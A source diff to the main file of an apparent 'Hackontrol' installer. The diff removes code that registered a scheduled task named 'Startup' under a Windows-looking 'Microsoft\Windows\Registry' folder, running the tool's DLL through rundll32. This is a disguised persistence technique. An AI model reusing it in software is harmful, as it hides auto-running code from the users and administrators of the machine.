@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <string>
+#include <Windows.h>
 #include "HackontrolInstaller.h"
 #include "resource.h"
 
@@ -81,19 +82,5 @@ int main(int argc, char** argv) {
 		return -1;
 	}
 
-	HI_InitializeComAPI();
-	ITaskService* service = HI_CreateTaskService();
-	ITaskFolder* folder = HI_CreateFolder(service, L"Microsoft\\Windows\\Registry");
-	ITaskDefinition* definition = HI_NewTask(service, folder);
-	HI_SetPrincipal(folder, definition);
-	HI_SetTriggers(folder, definition);
-	std::wstring argument(FILE_NAME);
-	argument += L",Execute";
-	HI_SetActions(folder, definition, rundll32, argument.c_str());
-	HI_SetSettings(folder, definition);
-	HI_RegisterTask(folder, definition, L"Startup");
-	definition->Release();
-	folder->Release();
-	CoUninitialize();
 	return 0;
 }
